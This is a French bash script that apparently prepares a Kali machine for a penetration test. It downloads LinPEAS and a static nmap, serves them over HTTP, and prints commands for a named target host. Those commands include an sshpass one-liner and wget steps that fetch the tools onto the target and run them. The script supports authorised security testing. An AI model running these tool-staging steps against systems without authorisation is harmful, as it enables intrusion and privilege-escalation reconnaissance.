#!/bin/bash
# ============================================================================
# SCRIPT DE PRÉPARATION KALI - IRON4SOFTWARE
# Prépare tout pour le déploiement: télécharge outils, lance serveur HTTP
# ============================================================================

set -e

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# Configuration
WORK_DIR="$HOME/pentest-tools-iron4software"
HTTP_PORT="${1:-8080}"
LINPEAS_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
NMAP_STATIC_URL="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap"

# Variables globales
HTTP_PID=""
KALI_IP=""

log() { echo -e "${GREEN}[+]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_critical() { echo -e "${RED}${BOLD}[!!!]${NC} $1"; }

banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════════╗
║                   PRÉPARATION KALI - IRON4SOFTWARE                   ║
║              Téléchargement Outils + Serveur HTTP                    ║
╚══════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Vérification outils
check_tools() {
    log "Vérification des outils..."
    
    local tools=("wget" "python3")
    local missing=()
    
    for tool in "${tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        log_error "Outils manquants: ${missing[*]}"
        log_info "Installation: sudo apt install ${missing[*]}"
        exit 1
    fi
    
    log "Outils disponibles ✓"
}

# Création workspace
create_workspace() {
    log_critical "CRÉATION WORKSPACE"
    
    if [ -d "$WORK_DIR" ]; then
        log_warning "Dossier existe déjà: $WORK_DIR"
        read -p "$(echo -e ${YELLOW}Réutiliser ce dossier ? [Y/n]: ${NC})" -n 1 -r
        echo
        
        if [[ $REPLY =~ ^[Nn]$ ]]; then
            WORK_DIR="${WORK_DIR}_$(date +%s)"
            mkdir -p "$WORK_DIR"
            log "Nouveau dossier créé: $WORK_DIR"
        else
            log "Réutilisation du dossier existant"
        fi
    else
        mkdir -p "$WORK_DIR"
        log "Dossier créé: $WORK_DIR"
    fi
    
    cd "$WORK_DIR"
    log "Workspace actif: $PWD"
}

# Téléchargement LinPEAS
download_linpeas() {
    log_critical "TÉLÉCHARGEMENT LINPEAS"
    
    if [ -f "linpeas.sh" ]; then
        log "LinPEAS déjà présent ($(du -h linpeas.sh | cut -f1))"
        return 0
    fi
    
    log_info "Téléchargement depuis GitHub..."
    
    if wget -q --show-progress "$LINPEAS_URL" -O linpeas.sh; then
        chmod +x linpeas.sh
        log "LinPEAS téléchargé ✓ ($(du -h linpeas.sh | cut -f1))"
        return 0
    else
        log_error "Échec téléchargement LinPEAS"
        return 1
    fi
}

# Téléchargement Nmap
download_nmap() {
    log_critical "TÉLÉCHARGEMENT NMAP STATIQUE"
    
    if [ -f "nmap" ]; then
        log "Nmap déjà présent ($(du -h nmap | cut -f1))"
        return 0
    fi
    
    log_info "Téléchargement binaire statique..."
    
    if wget -q --show-progress "$NMAP_STATIC_URL" -O nmap; then
        chmod +x nmap
        log "Nmap téléchargé ✓ ($(du -h nmap | cut -f1))"
        
        # Test
        if ./nmap --version &> /dev/null; then
            local version=$(./nmap --version | head -1)
            log_info "$version"
        fi
        return 0
    else
        log_error "Échec téléchargement Nmap"
        return 1
    fi
}

# Copier script download_tools.sh
copy_download_script() {
    log_critical "COPIE SCRIPT DOWNLOAD_TOOLS.SH"
    
    # Chercher le script dans plusieurs emplacements
    local script_locations=(
        "./download_tools.sh"
        "../download_tools.sh"
        "$HOME/iron4software-guide/download_tools.sh"
        "$(dirname $0)/download_tools.sh"
    )
    
    local found=0
    for location in "${script_locations[@]}"; do
        if [ -f "$location" ]; then
            cp "$location" "$WORK_DIR/download_tools.sh"
            chmod +x "$WORK_DIR/download_tools.sh"
            log "Script copié: download_tools.sh ✓"
            found=1
            break
        fi
    done
    
    if [ $found -eq 0 ]; then
        log_warning "Script download_tools.sh non trouvé"
        log_info "Pas grave, tu peux faire wget direct sur cible"
    fi
}

# Obtenir IP locale
get_local_ip() {
    log "Détection IP locale..."
    
    # Méthode 1: IP par défaut
    KALI_IP=$(ip route get 8.8.8.8 | grep -oP 'src \K\S+' 2>/dev/null)
    
    # Méthode 2: Première IP non-loopback
    if [ -z "$KALI_IP" ]; then
        KALI_IP=$(ip -4 addr show | grep inet | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    fi
    
    if [ -z "$KALI_IP" ]; then
        log_error "Impossible de détecter l'IP automatiquement"
        read -p "$(echo -e ${YELLOW}Entre ton IP manuellement: ${NC})" KALI_IP
    fi
    
    log "IP Kali: ${CYAN}$KALI_IP${NC}"
}

# Démarrer serveur HTTP
start_http_server() {
    log_critical "DÉMARRAGE SERVEUR HTTP"
    
    # Vérifier si port déjà utilisé
    if lsof -i :$HTTP_PORT &> /dev/null; then
        log_warning "Port $HTTP_PORT déjà utilisé"
        
        # Demander si arrêter l'ancien
        read -p "$(echo -e ${YELLOW}Arrêter le serveur existant et redémarrer ? [y/N]: ${NC})" -n 1 -r
        echo
        
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            pkill -f "python3 -m http.server $HTTP_PORT" 2>/dev/null || true
            sleep 1
        else
            log "Utilisation du serveur existant"
            return 0
        fi
    fi
    
    log_info "Lancement serveur sur port $HTTP_PORT..."
    
    # Démarrer en background
    python3 -m http.server $HTTP_PORT &> /dev/null &
    HTTP_PID=$!
    
    sleep 2
    
    if kill -0 $HTTP_PID 2>/dev/null; then
        log "Serveur HTTP démarré ✓ (PID: $HTTP_PID)"
        log_info "URL: ${CYAN}http://$KALI_IP:$HTTP_PORT/${NC}"
        
        # Sauvegarder PID
        echo $HTTP_PID > .http_server_pid
        
        return 0
    else
        log_error "Échec démarrage serveur HTTP"
        return 1
    fi
}

# Afficher résumé
show_summary() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                            RÉSUMÉ                                    ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${GREEN}${BOLD}Workspace Kali:${NC}"
    echo -e "  ${CYAN}$WORK_DIR${NC}"
    echo ""
    
    echo -e "${GREEN}${BOLD}Fichiers disponibles:${NC}"
    ls -lh "$WORK_DIR" | grep -v "^total\|^d" | awk '{printf "  %s  %s  %s\n", $9, $5, $1}'
    echo ""
    
    echo -e "${GREEN}${BOLD}Serveur HTTP:${NC}"
    echo -e "  URL: ${CYAN}http://$KALI_IP:$HTTP_PORT/${NC}"
    echo -e "  PID: ${CYAN}$HTTP_PID${NC}"
    echo ""
}

# Instructions SSH
show_ssh_instructions() {
    echo -e "${MAGENTA}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║                    INSTRUCTIONS POUR LA CIBLE                        ║${NC}"
    echo -e "${MAGENTA}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Variables cible par défaut (modifiables)
    local TARGET="${TARGET:-192.168.1.250}"
    local TARGET_USER="${TARGET_USER:-gporte}"
    
    echo -e "${YELLOW}${BOLD}Option 1: Upload script puis exécution (RECOMMANDÉ)${NC}"
    echo ""
    echo -e "${GREEN}# Depuis Kali (ce terminal ou un autre):${NC}"
    echo -e "${CYAN}scp $WORK_DIR/download_tools.sh $TARGET_USER@$TARGET:/tmp/${NC}"
    echo ""
    echo -e "${GREEN}# Puis sur la cible (SSH):${NC}"
    echo -e "${CYAN}ssh $TARGET_USER@$TARGET${NC}"
    echo -e "${CYAN}cd /tmp${NC}"
    echo -e "${CYAN}chmod +x download_tools.sh${NC}"
    echo -e "${CYAN}./download_tools.sh $KALI_IP${NC}"
    echo ""
    echo ""
    
    echo -e "${YELLOW}${BOLD}Option 2: wget direct sur cible (SIMPLE)${NC}"
    echo ""
    echo -e "${GREEN}# Sur la cible (SSH déjà ouvert):${NC}"
    echo -e "${CYAN}cd /tmp${NC}"
    echo -e "${CYAN}wget http://$KALI_IP:$HTTP_PORT/download_tools.sh${NC}"
    echo -e "${CYAN}chmod +x download_tools.sh${NC}"
    echo -e "${CYAN}./download_tools.sh $KALI_IP${NC}"
    echo ""
    echo ""
    
    echo -e "${YELLOW}${BOLD}Option 3: wget outils direct (ULTRA-SIMPLE)${NC}"
    echo ""
    echo -e "${GREEN}# Sur la cible (SSH déjà ouvert):${NC}"
    echo -e "${CYAN}mkdir -p /tmp/pentest && cd /tmp/pentest${NC}"
    echo -e "${CYAN}wget http://$KALI_IP:$HTTP_PORT/linpeas.sh \\${NC}"
    echo -e "${CYAN}     http://$KALI_IP:$HTTP_PORT/nmap${NC}"
    echo -e "${CYAN}chmod +x linpeas.sh nmap${NC}"
    echo -e "${CYAN}./linpeas.sh | tee output.txt${NC}"
    echo ""
    echo ""
    
    echo -e "${YELLOW}${BOLD}One-liner complet (avec sshpass):${NC}"
    echo ""
    echo -e "${CYAN}sshpass -p 'PASSWORD' scp $WORK_DIR/download_tools.sh $TARGET_USER@$TARGET:/tmp/ && \\${NC}"
    echo -e "${CYAN}sshpass -p 'PASSWORD' ssh $TARGET_USER@$TARGET \\${NC}"
    echo -e "${CYAN}  \"chmod +x /tmp/download_tools.sh && /tmp/download_tools.sh $KALI_IP\"${NC}"
    echo ""
}

# Commandes utiles
show_useful_commands() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                       COMMANDES UTILES                               ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${GREEN}# Vérifier serveur HTTP:${NC}"
    echo -e "${CYAN}curl http://$KALI_IP:$HTTP_PORT/${NC}"
    echo -e "${CYAN}lsof -i :$HTTP_PORT${NC}"
    echo ""
    
    echo -e "${GREEN}# Arrêter serveur HTTP:${NC}"
    echo -e "${CYAN}kill $HTTP_PID${NC}"
    echo -e "# Ou:"
    echo -e "${CYAN}pkill -f 'python3 -m http.server $HTTP_PORT'${NC}"
    echo ""
    
    echo -e "${GREEN}# Relancer serveur HTTP:${NC}"
    echo -e "${CYAN}cd $WORK_DIR${NC}"
    echo -e "${CYAN}python3 -m http.server $HTTP_PORT &${NC}"
    echo ""
    
    echo -e "${GREEN}# Télécharger outils à nouveau:${NC}"
    echo -e "${CYAN}cd $WORK_DIR${NC}"
    echo -e "${CYAN}wget -O linpeas.sh $LINPEAS_URL${NC}"
    echo -e "${CYAN}wget -O nmap $NMAP_STATIC_URL${NC}"
    echo ""
}

# Sauvegarder config
save_config() {
    cat > "$WORK_DIR/.config" << EOF
# Configuration Iron4Software
WORK_DIR="$WORK_DIR"
KALI_IP="$KALI_IP"
HTTP_PORT="$HTTP_PORT"
HTTP_PID="$HTTP_PID"
CREATED="$(date)"
EOF
    
    log_info "Configuration sauvegardée: $WORK_DIR/.config"
}

# Cleanup
cleanup() {
    # Ne pas tuer le serveur HTTP ici, on veut qu'il continue
    :
}
trap cleanup EXIT

# Afficher aide
show_help() {
    echo "Usage: $0 [PORT]"
    echo ""
    echo "Prépare l'environnement Kali pour Iron4Software:"
    echo "  - Crée workspace"
    echo "  - Télécharge LinPEAS et Nmap"
    echo "  - Lance serveur HTTP"
    echo "  - Affiche instructions SSH"
    echo ""
    echo "Arguments:"
    echo "  PORT    Port serveur HTTP (défaut: 8080)"
    echo ""
    echo "Exemples:"
    echo "  $0        # Port 8080"
    echo "  $0 9000   # Port 9000"
    echo ""
    exit 0
}

# Main
main() {
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        show_help
    fi
    
    banner
    
    log_critical "PRÉPARATION KALI - IRON4SOFTWARE"
    log_info "Port serveur HTTP: $HTTP_PORT"
    echo ""
    
    check_tools
    echo ""
    
    create_workspace
    echo ""
    
    download_linpeas
    echo ""
    
    download_nmap
    echo ""
    
    copy_download_script
    echo ""
    
    get_local_ip
    echo ""
    
    start_http_server
    echo ""
    
    save_config
    
    show_summary
    show_ssh_instructions
    show_useful_commands
    
    echo ""
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║                    PRÉPARATION TERMINÉE ✓                            ║${NC}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${YELLOW}${BOLD}Le serveur HTTP reste actif en arrière-plan.${NC}"
    echo -e "${YELLOW}Pour l'arrêter: ${CYAN}kill $HTTP_PID${NC}"
    echo ""
    echo -e "${YELLOW}Workspace: ${CYAN}$WORK_DIR${NC}"
    echo ""
}

main "$@"
